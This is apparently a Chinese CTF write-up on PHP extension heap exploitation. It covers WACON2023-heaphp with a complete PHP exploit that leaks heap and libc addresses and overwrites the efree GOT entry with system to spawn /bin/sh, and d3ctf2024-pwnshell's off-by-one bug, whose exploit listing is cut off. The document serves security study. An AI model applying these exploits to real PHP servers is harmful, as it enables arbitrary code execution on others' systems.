class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">ob_start</span> ([ <span class="keyword">callable</span> <span class="variable">$output_callback</span> = <span class="literal">NULL</span> [, <span class="keyword">int</span> <span class="variable">$chunk_size</span> = <span class="number">0</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = PHP_OUTPUT_HANDLER_STDFLAGS ]]] )</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>$output_callback</code>：可选参数，指定一个回调函数，用于处理输出缓冲中的内容。当指定了此参数时，缓冲区中的内容会被传递给该回调函数进行处理。</li><li><code>$chunk_size</code>：可选参数，指定每次写入缓冲区的字节数，默认为 0，表示不限制字节数。</li><li><code>$flags</code>：可选参数，用于设置输出处理的标志，通常使用默认值 <code>PHP_OUTPUT_HANDLER_STDFLAGS</code>。</li></ul><h4 id="ob-get-content"><a href="#ob-get-content" class="headerlink" title="ob_get_content()"></a>ob_get_content()</h4><p><code>ob_get_contents()</code> 是 PHP 中的一个内置函数，用于获取当前输出缓冲区的内容，并返回缓冲区的内容作为字符串。</p><p>它的语法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span>|<span class="literal">false</span> <span class="title function_ invoke__">ob_get_contents</span> ([ <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> [, <span class="keyword">string</span> <span class="variable">$chunk_size</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$length</span> ]]] )</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>$flags</code>：可选参数，用于指定获取缓冲区内容的选项，默认为0。</li><li><code>$chunk_size</code>：可选参数，用于指定每次读取缓冲区的字节数，默认为-1，表示读取全部内容。</li><li><code>$length</code>：可选参数，如果指定了该参数并且 <code>$flags</code> 设置为 <code>PHP_OUTPUT_HANDLER_FLUSHABLE</code>，则该参数将用于返回读取的字节数。</li></ul><h4 id="ob-end-flush"><a href="#ob-end-flush" class="headerlink" title="ob_end_flush"></a>ob_end_flush</h4><p><code>ob_end_flush()</code> 是 PHP 中的一个内置函数，用于结束当前的输出缓冲并将缓冲区的内容输出到浏览器。同时，它也会关闭当前的输出缓冲区，使之后的输出直接发送到客户端而不经过缓冲。</p><p>它的语法如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">ob_end_flush</span> <span class="params">( <span class="type">void</span> )</span></span><br></pre></td></tr></table></figure><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p><code>gdb php</code></p><p>先<code>set args -c php.ini</code>空跑一遍,加载so拓展,然后下断点</p><p>再<code>set args -c php.ini exp.php</code>然后即可进行调试</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="WACON2023-heaphp"><a href="#WACON2023-heaphp" class="headerlink" title="WACON2023-heaphp"></a>WACON2023-heaphp</h2><p><a href="https://deepunk.icu/php-pwn/">PHP 堆利用简介 —- A Brief Introduction to PHP Heap Exploitation (deepunk.icu)</a></p><p>给了一个heaphp.so文件,应该就是存在漏洞的拓展文件</p><p>保护基本全开,除了Partial RELRO</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/heaphp/src/stuff/heaphp.so&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>这题甚至保留了note结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> note struc ; (<span class="keyword">sizeof</span>=<span class="number">0x30</span>, align=<span class="number">0x8</span>, copyof_166)</span><br><span class="line"><span class="number">00000000</span> title db <span class="number">32</span> dup(?)</span><br><span class="line"><span class="number">00000020</span> size dq ?</span><br><span class="line"><span class="number">00000028</span> content dq ?                            ; offset</span><br><span class="line"><span class="number">00000030</span> note ends</span><br></pre></td></tr></table></figure><p>因为是复现就不把所有函数都分析出来了</p><p>漏洞出在<code>zif_add_node</code>,创建一个新的note的时候会需要两个字符串参数,第一个作为note而当title,第二个作为note的content,并且只检测了第一个字符串的长度,第二个字符串是使用string结构描述符中的真实长度</p><p>十分关键的就是复制字符串2到note-&gt;content时使用的是memcpy</p><p>而申请content时却又是根据strlen来申请大小</p><p>这意味着如果这个字符串被<code>\0</code>截断那么最终复制的str2会发生溢出</p><p>那么就可以覆盖下一个堆块的fd指针,从而做到任意地址分配</p><p>通过覆盖任意笔记的内容指针，我们可以通过 <code>zif_view_note</code> 获取任意地址的内容。</p><p><strong>exp:</strong></p><p>真正调用时函数名字不需要前面的<code>zif_</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// function mychr($index)&#123;</span></span><br><span class="line"><span class="comment">// return [&#x27;\x00&#x27;, &#x27;\x01&#x27;, &#x27;\x02&#x27;, &#x27;\x03&#x27;, &#x27;\x04&#x27;, &#x27;\x05&#x27;, &#x27;\x06&#x27;, &#x27;\x07&#x27;, &#x27;\x08&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;, &#x27;\r&#x27;, &#x27;\x0e&#x27;, &#x27;\x0f&#x27;, &#x27;\x10&#x27;, &#x27;\x11&#x27;, &#x27;\x12&#x27;, &#x27;\x13&#x27;, &#x27;\x14&#x27;, &#x27;\x15&#x27;, &#x27;\x16&#x27;, &#x27;\x17&#x27;, &#x27;\x18&#x27;, &#x27;\x19&#x27;, &#x27;\x1a&#x27;, &#x27;\x1b&#x27;, &#x27;\x1c&#x27;, &#x27;\x1d&#x27;, &#x27;\x1e&#x27;, &#x27;\x1f&#x27;, &#x27; &#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;.&#x27;, &#x27;/&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;[&#x27;, &#x27;\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;_&#x27;, &#x27;`&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;&#123;&#x27;, &#x27;|&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;, &#x27;\x7f&#x27;, &#x27;\x80&#x27;, &#x27;\x81&#x27;, &#x27;\x82&#x27;, &#x27;\x83&#x27;, &#x27;\x84&#x27;, &#x27;\x85&#x27;, &#x27;\x86&#x27;, &#x27;\x87&#x27;, &#x27;\x88&#x27;, &#x27;\x89&#x27;, &#x27;\x8a&#x27;, &#x27;\x8b&#x27;, &#x27;\x8c&#x27;, &#x27;\x8d&#x27;, &#x27;\x8e&#x27;, &#x27;\x8f&#x27;, &#x27;\x90&#x27;, &#x27;\x91&#x27;, &#x27;\x92&#x27;, &#x27;\x93&#x27;, &#x27;\x94&#x27;, &#x27;\x95&#x27;, &#x27;\x96&#x27;, &#x27;\x97&#x27;, &#x27;\x98&#x27;, &#x27;\x99&#x27;, &#x27;\x9a&#x27;, &#x27;\x9b&#x27;, &#x27;\x9c&#x27;, &#x27;\x9d&#x27;, &#x27;\x9e&#x27;, &#x27;\x9f&#x27;, &#x27;\xa0&#x27;, &#x27;¡&#x27;, &#x27;¢&#x27;, &#x27;£&#x27;, &#x27;¤&#x27;, &#x27;¥&#x27;, &#x27;¦&#x27;, &#x27;§&#x27;, &#x27;¨&#x27;, &#x27;©&#x27;, &#x27;ª&#x27;, &#x27;«&#x27;, &#x27;¬&#x27;, &#x27;\xad&#x27;, &#x27;®&#x27;, &#x27;¯&#x27;, &#x27;°&#x27;, &#x27;±&#x27;, &#x27;²&#x27;, &#x27;³&#x27;, &#x27;´&#x27;, &#x27;µ&#x27;, &#x27;¶&#x27;, &#x27;·&#x27;, &#x27;¸&#x27;, &#x27;¹&#x27;, &#x27;º&#x27;, &#x27;»&#x27;, &#x27;¼&#x27;, &#x27;½&#x27;, &#x27;¾&#x27;, &#x27;¿&#x27;, &#x27;À&#x27;, &#x27;Á&#x27;, &#x27;Â&#x27;, &#x27;Ã&#x27;, &#x27;Ä&#x27;, &#x27;Å&#x27;, &#x27;Æ&#x27;, &#x27;Ç&#x27;, &#x27;È&#x27;, &#x27;É&#x27;, &#x27;Ê&#x27;, &#x27;Ë&#x27;, &#x27;Ì&#x27;, &#x27;Í&#x27;, &#x27;Î&#x27;, &#x27;Ï&#x27;, &#x27;Ð&#x27;, &#x27;Ñ&#x27;, &#x27;Ò&#x27;, &#x27;Ó&#x27;, &#x27;Ô&#x27;, &#x27;Õ&#x27;, &#x27;Ö&#x27;, &#x27;×&#x27;, &#x27;Ø&#x27;, &#x27;Ù&#x27;, &#x27;Ú&#x27;, &#x27;Û&#x27;, &#x27;Ü&#x27;, &#x27;Ý&#x27;, &#x27;Þ&#x27;, &#x27;ß&#x27;, &#x27;à&#x27;, &#x27;á&#x27;, &#x27;â&#x27;, &#x27;ã&#x27;, &#x27;ä&#x27;, &#x27;å&#x27;, &#x27;æ&#x27;, &#x27;ç&#x27;, &#x27;è&#x27;, &#x27;é&#x27;, &#x27;ê&#x27;, &#x27;ë&#x27;, &#x27;ì&#x27;, &#x27;í&#x27;, &#x27;î&#x27;, &#x27;ï&#x27;, &#x27;ð&#x27;, &#x27;ñ&#x27;, &#x27;ò&#x27;, &#x27;ó&#x27;, &#x27;ô&#x27;, &#x27;õ&#x27;, &#x27;ö&#x27;, &#x27;÷&#x27;, &#x27;ø&#x27;, &#x27;ù&#x27;, &#x27;ú&#x27;, &#x27;û&#x27;, &#x27;ü&#x27;, &#x27;ý&#x27;, &#x27;þ&#x27;, &#x27;ÿ&#x27;][$index];</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tobytes</span>(<span class="params"><span class="variable">$integerValue</span>, <span class="variable">$byteLength</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$byteString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$byteLength</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$byteString</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$integerValue</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="variable">$integerValue</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$byteString</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number1&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00/bin/shacaaadaaaeaaafaaagaaahaaaiaaajaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fd</span>=<span class="title function_ invoke__">list_note</span>();</span><br><span class="line"><span class="variable">$fd</span> = <span class="variable">$fd</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$decimalValue</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">6</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$char</span> = <span class="variable">$fd</span>[-<span class="variable">$i</span>];</span><br><span class="line">    <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>);</span><br><span class="line">    <span class="variable">$decimalValue</span> = (<span class="variable">$decimalValue</span> &lt;&lt; <span class="number">8</span>) | <span class="variable">$digit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$heap_base</span> = <span class="variable">$decimalValue</span> - <span class="number">0x1480</span>;</span><br><span class="line"><span class="variable">$target_libc</span> = <span class="variable">$heap_base</span> + <span class="number">0x82000</span>; </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot;</span> . <span class="title function_ invoke__">tobytes</span>(<span class="variable">$target_libc</span>,<span class="number">8</span>));</span><br><span class="line"><span class="variable">$libc_off</span> = <span class="title function_ invoke__">view_note</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$libc</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">5</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) &#123;</span><br><span class="line">    <span class="variable">$char</span> = <span class="variable">$libc_off</span>[<span class="variable">$i</span>];</span><br><span class="line">    <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>);</span><br><span class="line">    <span class="variable">$libc</span> = (<span class="variable">$libc</span> &lt;&lt; <span class="number">8</span>) | <span class="variable">$digit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$libc</span> -= <span class="number">0x219aa0</span>;</span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;%x&quot;</span>,<span class="variable">$libc</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$heaphp_base</span> = <span class="variable">$libc</span> + <span class="number">0x7af000</span>;</span><br><span class="line"><span class="variable">$sys_addr</span> = <span class="variable">$libc</span> + <span class="number">0x50d60</span>;</span><br><span class="line"><span class="variable">$efree_got_addr</span> = <span class="variable">$heaphp_base</span> + <span class="number">0x4058</span>;</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot;</span> . <span class="title function_ invoke__">tobytes</span>(<span class="variable">$efree_got_addr</span>,<span class="number">8</span>));</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;./readflag&quot;</span>,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">edit_note</span>(<span class="number">1</span>,<span class="title function_ invoke__">tobytes</span>(<span class="variable">$sys_addr</span>,<span class="number">8</span>));</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>phppwn是没办法直接交互的,所以最终必须要想办法拿到flag,可以重定向到某个新文件,或者反弹shell</p><h2 id="d3ctf2024-pwnshell"><a href="#d3ctf2024-pwnshell" class="headerlink" title="d3ctf2024-pwnshell"></a>d3ctf2024-pwnshell</h2><p>热乎的题目</p><p>note的结构大致如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> node struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, align=<span class="number">0x8</span>, copyof_8, variable size)</span><br><span class="line"><span class="number">00000000</span> ptr dq ?                                ; offset</span><br><span class="line"><span class="number">00000008</span> len dq ?</span><br><span class="line"><span class="number">00000010</span> des db <span class="number">0</span> dup(?)</span><br><span class="line"><span class="number">00000010</span> node ends</span><br></pre></td></tr></table></figure><p>chunklist的结构大致如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="built_in">list</span> struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, align=<span class="number">0x8</span>, copyof_9)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: .bss:chunkList/r</span><br><span class="line"><span class="number">00000000</span> ptr dq ?                                ; offset</span><br><span class="line"><span class="number">00000008</span> inuse dd ?</span><br><span class="line"><span class="number">0000000</span>C db ? ; undefined</span><br><span class="line"><span class="number">0000000</span>D db ? ; undefined</span><br><span class="line"><span class="number">0000000</span>E db ? ; undefined</span><br><span class="line"><span class="number">0000000F</span> db ? ; undefined</span><br><span class="line"><span class="number">00000010</span> <span class="built_in">list</span> ends</span><br></pre></td></tr></table></figure><p>在addHacker中存在off-by-one</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> ( v15[<span class="number">8</span>] == <span class="number">6</span> &amp;&amp; v14[<span class="number">8</span>] == <span class="number">6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">      p_inuse = &amp;chunkList[<span class="number">0</span>].inuse;</span><br><span class="line">      <span class="keyword">while</span> ( *(_BYTE *)p_inuse != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v5;</span><br><span class="line">        p_inuse += <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">16</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">      &#125;</span><br><span class="line">      v2 = v5;</span><br><span class="line">LABEL_9:</span><br><span class="line">      v7 = &amp;chunkList[v2];</span><br><span class="line">      v8 = (node *)_emalloc(*(_QWORD *)(*(_QWORD *)v14 + <span class="number">16LL</span>) + <span class="number">16LL</span>);</span><br><span class="line">      v9 = (<span class="type">char</span> *)_emalloc(*(_QWORD *)(*(_QWORD *)v15 + <span class="number">16LL</span>));</span><br><span class="line">      v8-&gt;ptr = v9;</span><br><span class="line">      v10 = *(_QWORD *)(*(_QWORD *)v15 + <span class="number">16LL</span>);</span><br><span class="line">      v11 = (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v15 + <span class="number">24LL</span>);</span><br><span class="line">      v8-&gt;len = v10;</span><br><span class="line">      <span class="built_in">memcpy</span>(v9, v11, v10);</span><br><span class="line">      v12 = v14;</span><br><span class="line">      <span class="built_in">memcpy</span>(v8-&gt;des, (<span class="type">const</span> <span class="type">void</span> *)(*(_QWORD *)v14 + <span class="number">24LL</span>), *(_QWORD *)(*(_QWORD *)v14 + <span class="number">16LL</span>));</span><br><span class="line">      v13 = *(_QWORD *)(*(_QWORD *)v12 + <span class="number">16LL</span>);</span><br><span class="line">      v7-&gt;ptr = (<span class="type">char</span> *)v8;</span><br><span class="line">      v7-&gt;inuse = <span class="number">13</span>;</span><br><span class="line">      v8-&gt;des[v13] = <span class="number">0</span>;<span class="comment">//off-by-one</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>off-by-one在zendmm分配器情况下是十分危险的,因为一个page所有的空闲块都会在链上,且没有random_list和hardend_list这样的保护</p><p>完全是裸的出现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff5400000</span> <span class="number">20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff5400000</span> —▸ <span class="number">0x7ffff5400040</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff5400008</span> —▸ <span class="number">0x7ffff5400000</span> —▸ <span class="number">0x7ffff5400040</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffff5400010</span> —▸ <span class="number">0x7ffff5400000</span> —▸ <span class="number">0x7ffff5400040</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffff5400018</span> ◂— <span class="number">0x9300000175</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffff5400020</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">5</span> skipped</span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x7ffff5400050</span> ◂— <span class="number">0x617d8</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x7ffff5400058</span> ◂— <span class="number">0x6a1d8</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x7ffff5400060</span> —▸ <span class="number">0x7ffff548d018</span> —▸ <span class="number">0x7ffff548d020</span> —▸ <span class="number">0x7ffff548d028</span> —▸ <span class="number">0x7ffff548d030</span> ◂— ...</span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x7ffff5400068</span> —▸ <span class="number">0x7ffff5482040</span> —▸ <span class="number">0x7ffff5482050</span> —▸ <span class="number">0x7ffff5482060</span> —▸ <span class="number">0x7ffff5482070</span> ◂— ...</span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x7ffff5400070</span> —▸ <span class="number">0x7ffff54010a8</span> —▸ <span class="number">0x7ffff54010c0</span> —▸ <span class="number">0x7ffff54010d8</span> —▸ <span class="number">0x7ffff54010f0</span> ◂— ...</span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x7ffff5400078</span> —▸ <span class="number">0x7ffff54026c0</span> —▸ <span class="number">0x7ffff54026e0</span> —▸ <span class="number">0x7ffff5402700</span> —▸ <span class="number">0x7ffff5402780</span> ◂— ...</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x7ffff5400080</span> —▸ <span class="number">0x7ffff54687a8</span> —▸ <span class="number">0x7ffff54687d0</span> —▸ <span class="number">0x7ffff54687f8</span> —▸ <span class="number">0x7ffff5468820</span> ◂— ...</span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x7ffff5400088</span> —▸ <span class="number">0x7ffff545d330</span> —▸ <span class="number">0x7ffff545d360</span> —▸ <span class="number">0x7ffff545d390</span> —▸ <span class="number">0x7ffff545d3c0</span> ◂— ...</span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x7ffff5400090</span> —▸ <span class="number">0x7ffff54563f0</span> —▸ <span class="number">0x7ffff5456428</span> —▸ <span class="number">0x7ffff5456460</span> —▸ <span class="number">0x7ffff5456498</span> ◂— ...</span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0x7ffff5400098</span> —▸ <span class="number">0x7ffff5473100</span> —▸ <span class="number">0x7ffff5473140</span> —▸ <span class="number">0x7ffff5473180</span> —▸ <span class="number">0x7ffff54731c0</span> ◂— ...</span><br></pre></td></tr></table></figure><p>特别注意到0x40的链,其第一个空闲chunkA的地址是00结尾,那么如果使用他来off-by-one则直接可以使得下下个分配出来的chunk又是A</p><p><strong>利用:</strong></p><ol><li>分配一个0x40的chunkA,并触发off-by-one</li><li>分配两个0x40的chunk,第二个会覆盖A的ptr指针,写入目标指针</li><li>修改chunkA-&gt;content的内容,实现任意写,这里选择修改_efree的got表为system</li><li>新增一个以需要执行命令为开头的chunk,并删除</li></ol><p>利用比较简单,几乎没有费脑的地方</p><p><strong>exp:</strong></p><p>这里选择直接包含<code>/proc/self/maps</code>来获取各种基址</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 